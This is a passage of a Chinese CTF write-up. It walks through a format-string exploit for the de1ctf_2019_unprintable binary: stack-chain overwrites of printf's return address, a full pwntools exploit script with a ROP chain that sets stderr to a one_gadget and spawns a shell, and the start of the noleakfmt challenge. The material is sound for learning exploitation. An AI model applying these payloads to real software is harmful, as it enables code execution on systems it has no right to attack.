    0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    看到上面这三条栈链，类似于第一题的做法，我们将
    0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2420 —▸ 0x7fb6ffb1a168 ◂— 0x298
    修改为
    0d:0068│      0x7ffdcc6a2478 —▸ 0x7ffdcc6a2450 —▸ 0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d
    0040处的栈就变成了
    08:0040│      0x7ffdcc6a2450 —▸ 0x7ffdcc6a2418 —▸ 0x7fb6ff903e27 (_dl_fini+823) ◂— test   r13d, r13d
    这样我们就能通过修改0040处的栈来修改0008处的栈值了
payload如下
    payload = '%' + str(0xA3) + 'c%23$hhn'#修改返回地址为0x4007a3
    payload += '%' + str((stack-0xa3)&0xff) + 'c%18$hhn'#修改0068得栈链指向0008处，这里减a3得原因是因为前面已经输出了0xa3个字节了，如果不减的话%18处得栈的后四位就会被修改为stack&0xffff+0xa3
修改之前如下
修改之后如下
可以看到返回地址已经被修改为了0x4007a3，栈链也修改成功
下一步继续修改0008处的值，payload如下
    stack = stack+2 
    payload = '%' + str(0xA3) + 'c%23$hhn'#修改返回地址
    tmp1 = (stack-0xa3)&0xff
    payload += '%' + str(tmp1) + 'c%18$hhn'#修改0068处的栈链
    tmp2 = tmp1+0xa3
    payload += '%' + str((addr1-tmp2)&0xffff) + 'c%13$hn'#修改0008处栈的值
修改前
修改后
可以看到0008处栈的值的后四位被修改为了rop链存放地址的后四位
接下来继续修改，payload如下
    stack = stack+2
    payload = '%' + str(0x60) + 'c%13$hn'
    payload += '%' + str(0xA3-0x60) + 'c%23$hhn'
    tmp1 = (stack-0xa3)&0xff
    payload += '%' + str(tmp1) + 'c%18$hhn'
修改后如下
接下来是最后一次payload，要将0008处前面的0x7fec清零，修改返回地址为pop rsp的地址，还要将rop链写入
    payload = '%13$hn'
    payload += '%' + str(pop_rsp&0xffff) + 'c%23$hn'
    payload = payload.ljust(0x200,'\x00')
    payload += rop
修改完成后如下
返回地址已经被修改为了pop rsp，rop链地址也修改完了
顺便说一下0008处的地址为什么是0x601248，我们设置的rop链存放的位置是0x601060，相对于buf的起始地址为0x200，而pop
rsp的完整指令如下`0x000000000040082d : pop rsp ; pop r13 ; pop r14 ; pop r15 ;
ret`，除了将0x601248
pop到rsp，还要pop三个值到三个寄存器中，所以我们pop到rsp的地址需要相对于存放rop链的地址往高处空出3*8个字节，留给r13，r14和r15。
完整exp如下(来自于[四道题看格串新的利用方式](https://www.anquanke.com/post/id/221267#h3-4))
    from pwn import *
    p = process("./de1ctf_2019_unprintable",env={'LD_PRELOAD':'./libc-2.23.so'})
    libc = ELF("./libc-2.23.so")
    #获取stack地址，并计算出要修改的地址
    p.recvuntil("0x")
    stack = int(p.recv(12),16)-0x110-8
    print hex(stack)
    #劫持l_addr，从而在buf中伪造fini_array，再一次读并输出格式化字符串
    payload = "%"+str(0x298)+"c%26$hn"
    payload = payload.ljust(0x10,'\x00')+p64(0x4007A3)
    p.send(payload)
    sleep(1)
    pop_rsp = 0x000000000040082d
    csu_pop = 0x000000000040082A
    csu_call = 0x0000000000400810
    stderr_ptr_addr = 0x0000000000601040
    stdout_ptr_addr = 0x0000000000601020
    one = [0x45226,0x4527a,0xf0364,0xf1207]
    one = [0x45216,0x4526a,0xf02a4,0xf1147]
    one_gadget = one[3]
    offset = one_gadget - libc.sym['_IO_2_1_stderr_']
    adc_p_rbp_edx = 0x00000000004006E8
    rop_addr = 0x0000000000601260
    tmp = stderr_ptr_addr-0x48
    #利用adc将stderr修改为one_gadget
    rop = p64(csu_pop)
    rop += p64(tmp-1) #rbx
    rop += p64(tmp) #rbp
    rop += p64(rop_addr + 0x8 * 6 - tmp * 8 + 0x10000000000000000) #r12
    rop += p64(offset + 0x10000000000000000) #r13
    rop += p64(adc_p_rbp_edx) #r14
    rop += p64(0) #r15
    rop += p64(csu_call)
    #call onegadget
    rop += p64(csu_pop)
    rop += p64(0) #rbx
    rop += p64(1) #rbp
    rop += p64(stderr_ptr_addr) #r12
    rop += p64(0) #r13
    rop += p64(0) #r14
    rop += p64(0) #r15
    rop += p64(csu_call)
    rop_addr = rop_addr-0x18
    addr1 = rop_addr&0xffff+0x10000
    addr2 = (rop_addr>>16)&0xffff+0x10000
    addr3 = (rop_addr>>32)&0xffff+0x10000
    #0 劫持printf的返回地址，并将指针指向返回地址的下一地址，方便后面迁栈
    payload = '%' + str(0xA3) + 'c%23$hhn'
    payload += '%' + str((stack-0xa3)&0xff) + 'c%18$hhn'
    p.send(payload)
    sleep(1)
    #1-2为迁栈过程，即不断劫持printf的返回地址，并依次将下一地址修改为指向buf上存放rop串处，并且最终将返回地址改为pop rsp，从而执行rop串
    #1 
    stack = stack+2
    payload = '%' + str(0xA3) + 'c%23$hhn'
    tmp1 = (stack-0xa3)&0xff
    payload += '%' + str(tmp1) + 'c%18$hhn'
    tmp2 = tmp1+0xa3
    payload += '%' + str((addr1-tmp2)&0xffff) + 'c%13$hn'
    p.send(payload)
    sleep(1)
    #2
    stack = stack+2
    payload = '%' + str(0x60) + 'c%13$hn'
    payload += '%' + str(0xA3-0x60) + 'c%23$hhn'
    tmp1 = (stack-0xa3)&0xff
    payload += '%' + str(tmp1) + 'c%18$hhn'
    p.send(payload)
    sleep(1)
    #3 继续将返回地址的下一地址修改为指向buf上存放rop串处，并且最终将返回地址改为pop rsp，从而执行rop串
    payload = '%13$hn'
    payload += '%' + str(pop_rsp&0xffff) + 'c%23$hn'
    payload = payload.ljust(0x200,'\x00')
    payload += rop
    #gdb.attach(p,'b *0x4007C1')
    p.send(payload)
    sleep(1)
    #重新获取shell，并恢复stderr
    p.sendline("sh >&2")
    p.interactive()
这里再说一下rop链的构造
    rop = p64(csu_pop)
    rop += p64(tmp-1) #rbx
    rop += p64(tmp) #rbp
    rop += p64(rop_addr + 0x8 * 6 - tmp * 8 + 0x10000000000000000) #r12
    rop += p64(offset + 0x10000000000000000) #r13
    rop += p64(adc_p_rbp_edx) #r14
    rop += p64(0) #r15
    rop += p64(csu_call)
其实我一开始不太明白`rbx`为什么要设置为`stderr_ptr_addr-0x48-1`，还有`r12`和`r13`的设置，动调加思考之后才明白。  
由于在csu中最终要调用这条指令
    call    qword ptr [r12+rbx*8]
而我们要利用这条指令调用`0x4006E8`处的指令，因此[r12+rbx*8]需要为`0x4006E8`。我们的rop链的起始存储地址为0x601260，向下依次+8字节地址，`adc_p_rbp_edx`这条gadget存储在`0x601088`的位置。
`r12+rbx*8`=`rop_addr + 0x8 * 6 - tmp *
8+8*(tmp-1)`=`0x601260+0x30-0x600ff8*8+8\*0x600ff7`,从数学计算上来看这个式子确实等于0x601088，但这是因为我们自动将其化简得来的，在计算机中则会先计算`rop_addr
+ 0x8 * 6 - tmp * 8`这个式子，就会得到一个负数，在计算机中负数是以补码表示的，会算得这个结果`FFFF FFFF FD5F
92D0`，因此我们加上0x10000000000000000把前面的ff给去掉。至于r13，会被pop到rdx，`offset = one_gadget
- libc.sym['_IO_2_1_stderr_']`是一个负数，同样需要`+0x10000000000000000`来把前面的ff清0.
这题就到此为止，受益良多的一题
## 0x3.西湖论剑-noleakfmt
这题在某种程度上又可以看成上一题的升级版
检查保护
IDA分析
这题和上一题的区别在于没有stderr，但可以无限输入。
由于没有stderr，所以我们不能像上一题那样直接改stderr为onegadget，我们要使程序能够重新输出以获得libc，因此需要修改`_IO_2_1_stdout`结构体中的fileno成员为2，然后就能重新输出，之后再修改malloc_hook的值为onegadget，通过输入大量字符来触发onegadget。
在printf函数栈的上方存在着`_IO_2_1_stdout`的地址，我们可以通过抬栈使`_IO_2_1_stdout`落到printf函数栈中
在libc_start_main函数中有如下指令
    0x00007ffff7a2d750 :    push   r14
    0x00007ffff7a2d752 :    push   r13
    0x00007ffff7a2d754 :    push   r12
    0x00007ffff7a2d756 :    push   rbp
    0x00007ffff7a2d757 :    mov    rbp,rcx
    0x00007ffff7a2d75a :    push   rbx
    0x00007ffff7a2d75b :    sub    rsp,0x90
可以将栈抬高0x90
抬高0x90之后的printf函数栈空间是能够包含`_IO_2_1_stdout`的，两者栈的距离小于0x90